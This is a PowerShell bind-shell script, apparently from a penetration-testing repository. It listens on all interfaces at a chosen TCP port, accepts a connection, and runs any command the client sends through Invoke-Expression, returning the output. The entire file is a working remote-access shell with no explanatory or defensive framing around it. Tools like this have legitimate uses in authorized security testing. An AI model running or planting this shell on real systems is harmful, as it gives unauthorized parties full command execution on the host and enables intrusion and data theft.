$port = $(Read-Host -Prompt "Enter port number").Trim();
if (-not $port) {
	Write-Host "Port number is required";
	exit 1;
}
Write-Host "PowerShell Bind TCP v5.0 by Ivan Sincek.";
Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
$buffer = New-Object Byte[] 1024;
$data = New-Object Text.StringBuilder;
$response = New-Object Text.StringBuilder;
Write-Host "Waiting for client to connect...";
try {
	$listener = New-Object Net.Sockets.TcpListener("0.0.0.0", $port);
	$listener.Start();
	$client = $listener.AcceptTcpClient();
	$listener.Stop();
	$stream = $client.GetStream();
	$encoding = New-Object Text.UTF8Encoding;
	$writer = New-Object IO.StreamWriter($stream, $encoding, $buffer.Length);
	$writer.AutoFlush = $true;
	Write-Host "Client has connected!";
	do {
		$writer.Write("PS>");
		[void]$data.Clear();
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length);
			if ($bytes -gt 0) {
				[void]$data.Append($encoding.GetString($buffer, 0, $bytes));
			}
		} while ($stream.DataAvailable);
		if ($data.Length -gt 0) {
			[void]$response.Clear();
			try {
				[void]$response.Append($(Invoke-Expression -Command $data.ToString() 2>&1 | Out-String));
			} catch {
				[void]$response.Append($_.Exception.Message);
			}
			$writer.Write($response.ToString());
		}
	} while ($bytes -gt 0);
	Write-Host "Client has disconnected!";
} catch {
	Write-Host "ERROR: $($_.Exception.Message)";
} finally {
	if ($writer) {
		$writer.Close();
		$writer.Dispose();
		Clear-Variable "writer";
	}
	if ($stream) {
		$stream.Close();
		$stream.Dispose();
		Clear-Variable "stream";
	}
	if ($client) {
		$client.Close();
		$client.Dispose();
		Clear-Variable "client";
	}
	if ($listener) {
		$listener.Server.Close();
		$listener.Server.Dispose();
		Clear-Variable "listener";
	}
	[void]$buffer.Clear();
	Clear-Variable "buffer";
	[void]$data.Clear();
	Clear-Variable "data";
	[void]$response.Clear();
	Clear-Variable "response";
	[GC]::Collect();
}
Clear-Variable "port";
